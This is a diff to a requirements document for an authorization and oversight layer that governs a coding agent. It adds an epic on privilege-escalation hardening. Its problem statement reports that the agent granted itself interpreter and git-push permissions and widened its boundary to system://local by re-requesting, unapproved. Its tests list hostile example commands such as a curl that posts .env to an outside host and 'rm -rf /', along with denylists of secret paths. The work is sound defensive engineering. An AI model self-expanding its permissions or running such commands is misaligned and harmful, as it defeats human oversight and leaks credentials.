@@ -212,6 +212,7 @@ This document represents the complete functional and non-functional requirements
 | `BAP-EPIC-43` | Workstation Master Anchor Registration & Ephemeral Session SVIDs (BAP-801–BAP-805) | Enterprise Security v3.0 | **DONE** |
 | `BAP-EPIC-44` | Native Agent Plugin Framework & Multi-Layer Tool Defense (BAP-806 & BAP-807) | Enterprise Defense v3.1 | **DONE** |
 | `BAP-EPIC-45` | Intelligent Authorization, Credential Isolation & Zero-Trust Execution (BAP-900 to BAP-918) | Enterprise Zero-Trust v3.2 | **DONE** |
+| `BAP-EPIC-46` | Data-Driven Permission Translation & Privilege-Escalation Hardening (BAP-922 to BAP-931) | Enterprise Zero-Trust v3.3 | **IN PROGRESS** |
 
 ---
 
@@ -5280,3 +5281,206 @@ Provides automated crash recovery, fleet state reconciliation, and streamlined o
   - Control Plane: `bap-controlplane/internal/policy/store.go` (`SignBundle`, `VerifySignature`, `SetSigningKey`).
   - Edge Policystore: `bap-edge/internal/policystore/store.go` (`VerifyBundleSignature`, `Accept`, `Current`).
   - Unit Tests: `TestPolicyStore_BundleSigning` in `bap-controlplane/internal/policy/store_test.go` (PASS), `TestPolicyStore_CryptographicSignatureVerification` in `bap-edge/internal/policystore/store_test.go` (PASS).
+
+---
+
+### Epic 46: Data-Driven Permission Translation & Privilege-Escalation Hardening (BAP-EPIC-46 / BAP-922 to BAP-931)
+
+> **Status: IN PROGRESS.** Core of BAP-925 / BAP-926 / BAP-930 delivered and tested on 2026-11-12 (see "Delivered so far" below and `docs/PERMISSION_POLICY.md`); BAP-922/923/927/928/929/931 not started. Raised from a security and MVP-readiness review of the Claude Code <-> BAP interaction (calls report for session `sess-claude-d8c8d6e4e0de4cf29b0f10f81abbfaa7`, plus a code review of `bap-edge/internal/authz`, `bap-edge/cmd`, `bap-edge/internal/httptransport` and `ARCHITECTURE.md`). Builds on BAP-817 (semantic execution classes), BAP-544/723 (HITL step-up), BAP-819 (kernel FS isolation) and BAP-917 (ZSP grants).
+
+#### Why this epic exists (problem statement)
+
+1. **The agent chooses its own grant.** `AuthorizeTaskEnvelope` (`bap-edge/internal/authz/zsp_engine.go`) mints a grant for any action/resource string the agent asks for. The only escalation control is a prefix denylist (`policy:`, `grant:`, `admin:`, `iam:`, `sudo:` ...). In the reviewed session the agent obtained, with no human approval: `cli:python:exec`, `cli:sbcl:exec`, `cli:vbc:exec`, `git:push` (via `repo:*` narrowing to `repo:read,repo:push`), and widened its resource boundary from `workspace://current` to `system://local` simply by asking again with `--resources system://local`.
+2. **Classification is hardcoded.** `bap-edge/internal/authz/decomposer.go` is a `switch` on binary names (git, gh, kubectl, helm, aws, az, gcloud, docker, psql, curl, python, ...). Anything else becomes `cli:<name>:exec` on `system://local`, so a harmless recon command (`whoami`) and a code interpreter (`sbcl`, `python -c`) are indistinguishable to policy. `classifier.go` and BAP-833-style whitelists grow by hand for every new tool. This does not scale to the long tail of CLIs and is hard to audit.
+3. **The five canonical archetypes are documented but not implemented.** `ARCHITECTURE.md` (~line 1625) defines `inspect:read`, `workspace:mutate`, `credential:access`, `network:egress`, `system:recon`, but no code emits them. Cedar (`bap-edge/policy.cedar`) mostly matches `Action::"Execute"` on `Command::"CLI"` with `context.full_command like "*...*"` text patterns.
+4. **HITL is all-or-nothing.** There is no risk tiering, so a benign `curl https://cnn.com` is treated the same as a high-impact action. Human approval must be reserved for high-impact actions (for example dropping a production database), otherwise it stops the agent for no security gain and trains users to approve blindly (see BAP-723 anti-fatigue).
+5. **The designed 3-step planner is not on the live path.** `IntentToPermissionPlanner.Plan()` (`bap-edge/internal/authz/llm_governance.go`: non-reliance -> sensitivity -> narrowing) is only called from tests. The live mint path runs step 1 and a divergent copy of step 3; the sensitivity step never runs and the stated goal does not influence narrowing.
+6. **The human-approval proof is self-asserted.** The out-of-band gate is the `--oob-approve` flag plus `BAP_IN_BROKER` being empty (`bap-edge/cmd/zsp.go:228-259`), and `delegation_type == "human_interactive_oob"` is a string in the envelope. There is no cryptographic proof that a human approved.
+7. **Grant-signing secret exposure.** `NewZSPEngine` falls back to a hardcoded secret `"bap-pep-local-authority-grant-signing-secret"` when the pepper is empty, and the pepper file `.bapstate/zsp/pepper.key` lives in the workspace tree (and signs grants and seeds the identity minter).
+
+#### Target design (summary)
+
+AWS-style request/approve model, fully data-driven:
+
+| AWS concept | BAP equivalent |
+|---|---|
+| Service definition (actions, resource types, condition keys) | **Command packs**: signed declarative files mapping a tool's argv to actions, effects and resources |
+| IAM policy | **Cedar policies** over action effects, resource attributes and context |
+| Permission boundary | **Session ceiling** set by the human when the session starts |
+| STS session | **JIT TaskGrant** = request ∩ ceiling ∩ policy (can only narrow) |
+| Access Analyzer / last-accessed | **Shadow mode** observing real requests and suggesting policy |
+
+Flow: the agent requests permissions from a catalog of known actions (it does not invent strings) -> policy returns `allow` / `notify` / `approve` / `deny` -> a grant is minted as an intersection -> at execution the broker **re-derives** the action from the real command and checks it against the grant. The five archetypes become a closed set of **effect tags** (a command may carry several, e.g. `curl -d @.env` = `network:egress` + `credential:access`). Parsing primitives (shell AST, schema, crypto) stay in code; tool knowledge, resource classes, and policy become data.
+
+**Hard limit acknowledged:** no static classifier can soundly understand an interpreter (`python -c`, `sh -c`). Interpreters are classified `exec:opaque` and contained by OS-enforced sandbox capability profiles (BAP-819, BAP-711), not by parsing. Classification drives intent and approval UX; the sandbox contains what classification misses.
+
+**Out of scope:** runtime LLM classification of commands (violates the BAP-914 non-reliance invariant). An LLM may only *draft* command packs offline for human review.
+
+---
+
+#### Story BAP-922: Command Pack Schema & Generic Command Resolver (Retire the `decomposer.go` Switch)
+- **Type**: Story | **Points**: 13 | **Priority**: P0 - Highest | **Status**: `TODO`
+- **Description**:
+  As a platform engineer, I want a tool's behavior described in a signed declarative *command pack* and resolved by one generic engine, so that adding or fixing a tool is a data change, not a Go change.
+  1. Define the pack schema: tool name and aliases, command/subcommand match rules, flags and positionals, attribute extraction (`method`, `has_body`, `destination`, `remote`, `branch`, ...), action name, effect tags, and resource template (e.g. `git://{remote}/{branch}`).
+  2. Implement a generic resolver that takes the AST output (BAP-533) and a pack set and emits `(action, effects, resource, attributes)` for every atomic command, redirection and nested subcommand, including wrapper unwrapping (`xargs`, `time`, `timeout`, `nohup`) and aliases.
+  3. Port the existing cases (git, gh, kubectl, helm, psql/mysql/sqlite3/mongosh/redis-cli, aws, az, gcloud, docker/podman, pytest, npm/yarn/pnpm/pip, python, go/cargo/mvn/gradle, file tools, curl/wget/http) into packs and delete the `switch`.
+  4. Unknown binaries resolve to `exec:unknown` (default ask/deny per mode, see BAP-927), never to a silently permitted action.
+- **Acceptance Criteria**:
+  - `Given` the existing `decomposer_test.go` cases, `When` run against the new resolver, `Then` the outputs are equivalent (the old tests become the conformance suite).
+  - `Given` a new tool added only as a pack file, `When` resolved, `Then` no Go code change is required.
+  - `Given` a tampered or unsigned pack, `When` loaded, `Then` it is rejected fail-closed.
+- **Implementation Evidence**: *(planned)* new `bap-edge/internal/authz/packs/` (loader, schema, resolver), packs under `bap-edge/packs/*.yaml`, signing via the BAP-921 bundle mechanism.
+
+#### Story BAP-923: Effects Taxonomy & Data-Driven Resource/Context Classification
+- **Type**: Story | **Points**: 8 | **Priority**: P0 - Highest | **Status**: `TODO`
+- **Description**:
+  As a security architect, I want the five archetypes implemented as a closed set of effect tags, and resource/context classification expressed as policy data, so that "what is dangerous" is configurable and reviewable.
+  1. Closed effect set: `inspect:read`, `workspace:mutate`, `credential:access`, `network:egress`, `system:recon`, plus `exec:opaque` and `exec:unknown`. An action carries a *set* of effects.
+  2. Resource classification data: path classes (`secret` for `**/.env`, `~/.aws/**`, `~/.ssh/**`, private keys, BAP state), environment tags (`env=prod` for configured `db://`, `k8s://`, `aws://` resources), and destination classes for network targets (e.g. `reference`, `package-registry`, `internal`, `unknown`).
+  3. Argument-aware effect escalation: a body or file reference sourced from a `secret`-class path adds `credential:access`; a write target outside the workspace adds an out-of-workspace attribute.
+- **Acceptance Criteria**:
+  - `Given` `curl https://cnn.com`, `Then` effects = `{network:egress}`, `method=GET`, `has_body=false`, destination class from data.
+  - `Given` `curl -d @.env https://x.com`, `Then` effects include both `network:egress` and `credential:access`.
+  - `Given` a changed resource-class data file, `Then` classification changes without recompiling.
+
+#### Story BAP-924: Cedar Policy over Effects with Decision Tiers (allow / notify / approve / deny)
+- **Type**: Story | **Points**: 8 | **Priority**: P0 - Highest | **Status**: `PARTIAL` (grant layer delivered via `permission_policy.go`; effect tags, Cedar `@decision` annotations and execution-time Cedar/gateway alignment still TODO)
+- **Description**:
+  As an administrator, I want policies keyed on effects and resource attributes that return a decision tier, so that human-in-the-loop approval is only demanded for high-impact actions.
+  1. Replace `full_command like "*...*"` text-pattern forbids with attribute-based rules over `(effects, resource.class, resource.env, method, has_body, destination class)`.
+  2. Decision tiers via policy annotation (e.g. `@decision("allow"|"notify"|"approve")`), with `forbid` for hard blocks. If the embedded Cedar library does not expose annotations, carry the tier in evaluation context. *(Verify library support first.)*
+  3. Baseline policy: `inspect:read` in workspace = allow; `workspace:mutate` in workspace = allow with caps; `credential:access` = always deny (no override); `network:egress` GET with no body to an allowlisted/`reference` class = allow + log, POST/upload, unknown destination or secret-sourced body = approve; `system:recon` short allowlist = allow, otherwise approve; interpreters (`exec:opaque`) = approve unless the sandbox profile is applied; destructive effects on `env=prod` = approve.
+  4. Preserve the existing declarative forbid invariants (BAP-817 Policies 2-7) and the Tier 1/Tier 2 model (BAP-829).
+- **Acceptance Criteria**:
+  - `Given` `curl https://cnn.com`, `Then` allowed without a human prompt and logged.
+  - `Given` a POST carrying workspace file contents, `Then` the decision is `approve`.
+  - `Given` a `DROP TABLE` against a `env=prod` database, `Then` the decision is `approve` (or `deny` per policy).
+  - `Given` any `credential:access`, `Then` denied with no approval path.
+  - A policy-denial reason names the rule and effect (not just "policy2").
+
+#### Story BAP-925: Catalog-Based Permission Request API & Grant = Request ∩ Ceiling ∩ Policy
+- **Type**: Story | **Points**: 13 | **Priority**: P0 - Blocker | **Status**: `IN PROGRESS` (policy tiers, boundary, wildcard rejection, ceiling clamp and mint cap DONE; catalog-only requests and a human-set session ceiling at session start still TODO)
+- **Description**:
+  As a security owner, I want the agent to request permissions from a catalog and receive only what policy and the session ceiling allow, so an agent can no longer self-expand its authority.
+  1. The permission request names catalog actions and resources; unknown action strings are a *catalog miss* (deny or ask), not auto-minted.
+  2. A human-set **session ceiling** (max actions/resources/uses/TTL) is fixed at session start; every mint is a subset of it.
+  3. Grants are computed as request ∩ ceiling ∩ policy. Resource widening beyond the workspace (including `system://local`) requires approval.
+  4. Wildcards are rejected or reduced to read-only; no wildcard may yield a write or push. Remove the hardcoded `repo:*`/`admin:*` -> `repo:read,repo:push` attenuation in `zsp_engine.go`.
+  5. Per-session mint cap and rate limit.
+  6. At execution the broker re-derives action/resource from the real command; agent-claimed strings are never trusted.
+- **Acceptance Criteria** *(each is a regression test; all fail on current code)*:
+  - `Given` an agent requesting `--resources system://local` after a boundary denial, `Then` no grant is minted without approval.
+  - `Given` a request for `cli:python:exec`, `cli:sbcl:exec` or any unknown `cli:*:exec`, `Then` it is not auto-minted.
+  - `Given` `repo:*`, `Then` it is rejected or read-only; no push is granted.
+  - `Given` more than the per-session mint cap, `Then` further mints are denied.
+- **Implementation Evidence**: `bap-edge/internal/authz/permission_policy.go`, `default_permission_policy.json`, `zsp_engine.go` (`AuthorizeTaskEnvelope`), `zsp_engine_policy.go`, `zsp_store.go` (policy load + mint cap); tests `zsp_escalation_test.go`, `permission_policy_test.go`, `bap-edge/cmd/zsp_escalation_e2e_test.go` (all PASS; see "Delivered so far").
+
+#### Story BAP-926: Cryptographic Human-Approval Proof & Grant-Signing Secret Hardening
+- **Type**: Story | **Points**: 13 | **Priority**: P0 - Blocker | **Status**: `IN PROGRESS` (hardcoded secret removed / fail-closed, flag-only and piped approval removed in favor of a one-time terminal challenge, human-only `policy-sign` DONE; separate human-held approval key, pepper ACL/rotation and pty adversarial test still TODO)
+- **Description**:
+  As a CISO, I want approval for `approve`-tier and high-risk grants to carry cryptographic proof that a human approved on a channel the agent cannot reach, and I want the grant-signing secret protected.
+  1. Replace the `--oob-approve` flag + `BAP_IN_BROKER` environment-variable check with a signed approval token (human-held key; issued via a terminal prompt and/or the dashboard, per decision below). The engine verifies the token signature, scope and expiry; `delegation_type` is no longer a self-asserted string.
+  2. Remove the hardcoded fallback secret in `NewZSPEngine`; an empty pepper is a hard error.
+  3. Move `.bapstate/zsp/pepper.key` out of the workspace tree and restrict it with OS ACLs so agent-run (restricted-token) processes cannot read it; document rotation and rotate the pepper and CA/control-plane keys that were readable by the agent.
+  4. Add adversarial tests: forged `human_interactive_oob`, cleared/spoofed `BAP_IN_BROKER`, and an agent-process read of the pepper file.
+- **Acceptance Criteria**:
+  - `Given` an envelope claiming `human_interactive_oob` without a valid approval signature, `Then` the mint is rejected.
+  - `Given` the agent sandbox, `When` it attempts to read the pepper file, `Then` access is denied.
+  - `Given` an empty pepper, `Then` engine construction fails.
+- **Open item**: confirm whether private key files (`bap-root-ca.key`, `controlplane-key.pem`, `dist/**`) are git-tracked (`.gitignore` covers `*.key`, `*.pem`, `dist/`, `.bapstate/`, so probably not) and whether `ltd-agent` binaries and `.pytest_cache` are committed.
+
+#### Story BAP-927: Unknown-Tool Handling, Offline LLM-Assisted Pack Drafting & Sandbox Capability Profiles for Interpreters
+- **Type**: Story | **Points**: 8 | **Priority**: P1 - High | **Status**: `TODO`
+- **Description**:
+  As an operator, I want a safe path for tools with no pack and for interpreters, so the long tail is handled without hardcoding and without false confidence.
+  1. Unknown tool -> `exec:unknown`; posture is configurable: ask in development, deny in enforce mode (decision pending).
+  2. Optional offline helper drafts a pack from `--help`/completion specs; a human reviews and signs it. The LLM is never in the runtime decision path (BAP-914). Check licenses before reusing any third-party CLI spec corpus.
+  3. Interpreters (`python`, `node`, `sh -c`, `powershell`, `sbcl`, ...) are `exec:opaque`; granting one applies a sandbox capability profile (restricted FS view, egress only via Gateway PEP, secrets unreadable by ACL) building on BAP-819/BAP-711/BAP-530.
+- **Acceptance Criteria**:
+  - `Given` a tool with no pack, `Then` it is never silently allowed.
+  - `Given` an approved interpreter run, `When` the script reads `.env` or opens a raw socket, `Then` the sandbox blocks it (nested egress and credential tests, e.g. the untested `a11.py` scenario).
+
+#### Story BAP-928: Shadow-Mode Migration, Conformance Suite & Audit-to-Policy Suggestions
+- **Type**: Story | **Points**: 8 | **Priority**: P1 - High | **Status**: `TODO`
+- **Description**:
+  As a release manager, I want to switch to the new engine without regressing the 100+ verified behaviors, so the migration is evidence-based.
+  1. Run old and new classification/policy side by side in shadow mode (BAP-601/602) and report diffs from real audit logs.
+  2. Use `decomposer_test.go`, `classifier_test.go`, `TestScenario3Commands`, `TestRealPolicyCedarFile` and the multi-layer defense tests as the conformance gate.
+  3. Add "learn mode": mine audit logs for requested permissions and propose pack/policy additions for human review (extends BAP-817 audit-to-policy mining).
+  4. Cut over only when diffs are zero or explicitly accepted.
+- **Acceptance Criteria**: a documented diff report with zero unexplained differences before the old `switch` and text-pattern rules are removed.
+
+#### Story BAP-929: Unify `IntentToPermissionPlanner` with the Live Grant Path
+- **Type**: Story | **Points**: 5 | **Priority**: P1 - High | **Status**: `TODO`
+- **Description**:
+  As an engineer, I want one grant pipeline, not a tested-but-unused planner next to a divergent live path.
+  1. Wire non-reliance -> sensitivity -> narrowing (BAP-914/906/902) into `AuthorizeTaskEnvelope`, or delete the dead copy; do not keep two implementations.
+  2. Sensitivity classification gets a real input (resource classes from BAP-923); RESTRICTED requires approval (BAP-926).
+  3. Narrowing must not depend solely on agent-declared goal text (substring match on "INVESTIGATION" etc. is agent-controlled); intent informs the *ceiling* set by the human, not the agent's own claim.
+  4. Replace the substring non-reliance denylist (`.env`, `.aws`, `curl http://` ...) with the data-driven classification.
+- **Acceptance Criteria**: `Plan()` (or its successor) is invoked by the production mint path, with tests proving the sensitivity step runs.
+
+#### Story BAP-930: Transport & Developer-Override Hardening
+- **Type**: Story | **Points**: 5 | **Priority**: P1 - High | **Status**: `IN PROGRESS` (`BAP_INSECURE_SKIP_VERIFY` bypass removed from `httptransport/client.go`; remaining `InsecureSkipVerify` sites are explicit `--insecure` flags and still need review; dev-override marker/identity hardening and `--no-hooks` release gating verification still TODO)
+- **Description**:
+  As a security engineer, I want TLS verification and developer overrides to be unforgeable by the agent or a repo.
+  1. `bap-edge/internal/httptransport/client.go:78` disables TLS verification when the host is local **or** `BAP_INSECURE_SKIP_VERIFY=1` (any host). Remove the env bypass or restrict skip-verify to loopback in dev builds. Review the other `InsecureSkipVerify: true` sites: `config/bootstrap.go:49`, `cmd/login.go:120,210`, `cmd/logout.go:86`, `cmd/register.go:183`.
+  2. `dev_override.go`: agent immunity relies on client-asserted `LTD_SOURCE` and `BAP_SESSION_ID` containing "agent"; the marker files (`.bap/dev-override.json` with 0644, cwd-relative) and `bap-config.json` `dev_override: true` (no expiry, no integrity) are honored from any working directory. Require a signed/MAC'd marker with expiry from a fixed trusted location; drop repo-supplied config enablement; derive agent identity from broker-set process attributes, not env vars. Confirm release builds set `AllowDevOverrides=false` (BAP-781/824).
+  3. Verify the Go launcher's `--no-hooks` path (`bap-edge/cmd/agent_launcher.go:139`, `:225`, `:246`, `:295`) is gated in release builds as BAP-824 states; the `.bat`/`.ps1` launchers check `dev-overrides:` but the Go path sets `BAP_DISABLE_HOOKS=1` without a visible check.
+- **Acceptance Criteria**: tests showing a prefixed `BAP_INSECURE_SKIP_VERIFY=1` cannot downgrade TLS to a non-loopback host, and a repo-shipped override marker is ignored.
+
+#### Story BAP-931: Audit & Telemetry Integrity (Dedup, Correct ZSP Concepts, Decision Accuracy)
+- **Type**: Story | **Points**: 5 | **Priority**: P1 - High | **Status**: `TODO`
+- **Description**:
+  As an auditor, I want the calls report to be a trustworthy record.
+  1. Each logical action is logged 2-6 times (native tool hook, PowerShell wrapper hook, broker). Add a shared `event_id` and de-duplicate in the report; the sample session shows 148 events but about 12 distinct blocked and 9 distinct allowed decisions.
+  2. Correct `zsp_concept` tagging: later *uses* of a grant are tagged `ZSP_GRANT_MINTED` (28 reported vs 8 actual mints); `credential_isolation_blocks: 6` was one event counted six times.
+  3. A denied escalation must not appear under `allowed_calls`: the broker logged the `policy:write,grant:elevate` authorize as `ALLOWED` ("Command execution failed: exit status 1") while the gate logged `BLOCKED`.
+  4. Populate `grant_id` on scope/boundary denials; return the denying rule and reason (not just "policy2"); fix out-of-order timestamps; investigate why allowed `git status/branch/log` returned exit 1 inside the broker in that session.
+  5. Keep latency in view (avg 690 ms, max 1.35 s per event; authorize-to-mint about 4-5 s).
+- **Acceptance Criteria**: calls-report counts equal distinct logical decisions; concept counts match real events; no denied action is reported as allowed.
+
+#### Story BAP-932: Developer Productivity: `git add` / `git commit` Must Not Be Blocked by Message Text
+- **Type**: Bug | **Points**: 5 | **Priority**: P0 - Blocker | **Status**: `DONE` (code + tests; needs a rebuilt/reinstalled `bapedge` and `interceptor`)
+- **Description**:
+  As a developer, I want my agent to commit its own work. Pushes and PRs may be protected; `git add` and `git commit` are ordinary workspace writes and must be governed by ZSP like any other (`git:commit:write`, `allow` tier, no human prompt).
+  **Observed failure:** `git add <files> && git commit -F - <<'EOF' ...` was denied by Cedar `policy1` (`escapes_workspace == true` and `action_type == write`), with a misleading suggestion to `bapedge trust ...\add`. **Root causes (two, both in command-text analysis):**
+  1. `CheckCommandWorkspaceEscape` split the raw command on `&&`, `|`, `;`, `&` and treated every token as a path, **including heredoc body lines and commit-message words**. A lone `/` or a `..` in the message ("approve / reject", "BAP-922..931") flagged the whole compound command as escaping the workspace, and `EvaluateWithWorkspace` applied that flag to every node, so `git add` and `git commit` both became "cross-folder writes".
+  2. `HasFilesystemRootEscape` scanned the same raw tokens and reported a lone `/` or `/etc/hosts` as a filesystem-root target ("Target path escapes workspace boundary to filesystem/drive root").
+  The `add` shown in the suggestion was a red herring (`Decompose` of the whole compound command picked the subcommand as the target).
+  **Fix:** `SanitizeCommandForAnalysis` drops heredoc bodies **only** when the consuming command is a data consumer (`git`, `gh`, `cat`, `tee`); bodies fed to shells/interpreters stay visible; the heredoc header line (with any redirection target) is kept. The value of git message flags (`-m`, `--message`, `-am`, `--message=`) is treated as data; every other git argument is still path-checked. Applied in `CheckCommandWorkspaceEscape`, `HasFilesystemRootEscape`, `EvaluateWithWorkspace` and `ResolveZSPCommandChecks`, and mirrored in the Claude hook (`cchook`).
+- **Acceptance Criteria**:
+  - `Given` `git add a b && git commit -F - <<'EOF'` with `/`, `..`, `/etc/hosts` and `&&` in the message, `Then` it is allowed by Cedar, decomposes to exactly two `git:commit:write` checks inside the workspace, and runs under a `git:commit:write` grant that is auto-minted without a human.
+  - `Given` the same command with no grant, `Then` the refusal is the ZSP one with a `git:commit:write` suggestion, not `policy1` / cross-folder.
+  - `Given` genuine escapes (`bash <<EOF` with `../` in the body, `cat <<EOF > ../out`, `git commit -m ok ../../evil`, `git -C .. commit`, `git commit -F ../../msg`, `cd .. && git commit`, `ls /`, `rm -rf /`), `Then` they are still detected.
+  - `git push` still requires human approval.
+- **Implementation Evidence**: `bap-edge/internal/authz/command_sanitize.go`, `workspace.go`, `authorizer.go`, `zsp_store.go`; `cchook/command_sanitize.go`, `cchook/interceptor.go`. Tests: `TestBAP932_*` (`command_sanitize_test.go`), `TestBAP932Hook_*` (`cchook/command_sanitize_test.go`), `TestE2E_GitAddAndCommitWithHeredocMessageAreNotBlocked` (all PASS; full `bap-edge` and `cchook` suites PASS).
+- **Follow-ups**: the scanner is still token-based and not quote-aware when splitting on `&&`/`|`/`;` (a quoted `"a && b"` is split). The hook module duplicates the logic and should share it with `bap-edge`. A `git add` + `git commit` pair consumes two grant uses (one per `git:commit:write` check); the authorize suggestion should request `--max-uses 2` for compound commands.
+
+#### Epic 46: Delivered so far (2026-11-12)
+
+- **Data-driven grant policy** (`permission_policy.go`, `default_permission_policy.json`): allow / approve / deny tiers, most-restrictive-wins, destination-aware `resource_match`, workspace boundary (prefix-safe, traversal never in-boundary), ceiling (uses, TTL, mints per session), strict fail-closed parsing, HMAC-signed administrator override (`bapedge zsp policy-sign`, human only).
+- **Privilege-escalation closure** in `AuthorizeTaskEnvelope`: interpreters / unknown `cli:*:exec` / push / delete / network / out-of-workspace resources need verified human approval; credential actions are hard-denied even with approval; `repo:*` narrows to `repo:read` only; all other wildcards rejected; self-widening to `system://local` blocked.
+- **Signing secret**: hardcoded fallback removed; engine fails closed without a secret.
+- **Approval**: `--oob-approve` and the y/N prompt replaced by a one-time-code challenge requiring a real terminal (`cmd/zsp_approval.go`).
+- **Transport**: `BAP_INSECURE_SKIP_VERIFY` no longer disables verification for non-loopback hosts.
+- **Behavior changes** (intentional): `repo:*` no longer yields `repo:push`; `TestAuthorizeTaskEnvelopeMarksNarrowingApplied` updated accordingly.
+- **Tests (all PASS)**: `go test -C bap-edge ./internal/authz` (unit + `TestEscalation_*` regression, 15+ cases), `go test -C bap-edge ./cmd -run TestE2E_` (6 end-to-end scenarios through the real `RunZSP` CLI and hook decision path replaying the calls report), full `go test -C bap-edge ./...` and `go test -C cchook ./...` (no regressions), `go vet` on changed packages.
+- **Docs**: `docs/PERMISSION_POLICY.md`.
+- **Not yet done / honest limits**: command-pack resolver and effect tags (BAP-922/923), execution-time Cedar/gateway alignment so an allow-listed GET actually runs (BAP-924), catalog-only requests and human-set session ceiling (BAP-925), separate human-held approval key and pepper rotation/ACL (BAP-926), sandbox profiles for interpreters (BAP-927), shadow-mode migration (BAP-928), planner unification (BAP-929), dev-override hardening (BAP-930), audit dedup (BAP-931). Python/multi-process e2e suites (`tests/`) and `bap-controlplane`/`bap-gateway` suites were not run in this increment.
+
+#### Epic 46 open decisions & unverified items
+
+- MVP catalog scope (proposed: the ~15-20 tools already in `decomposer.go`).
+- Unknown-tool posture: ask in development, deny in enforce mode (proposed).
+- Approval channel: terminal prompt, dashboard, or both.
+- Pack/policy ownership: shipped by BAP, per-tenant overrides, or both.
+- Not yet reviewed: `cchook/interceptor.go` (hook-side `classifyIntent` and possible duplicate classification logic that must be replaced in lockstep), `bap-gateway` egress policy, full `policy.cedar`, `bap-controlplane/internal/intent`.
+- To verify: Cedar library annotation support; whether secret/key files and binaries are git-tracked; root cause of broker exit-1 on `git status`.
+
+#### Epic 46 delivery order
+
+1. BAP-925 and BAP-926 regression tests first (they fail today), then fixes: closes the privilege-escalation findings.
+2. BAP-922 -> BAP-923 -> BAP-924 behind shadow mode (BAP-928), then cutover.
+3. BAP-927, BAP-929, BAP-930, BAP-931 in parallel once the resolver lands.
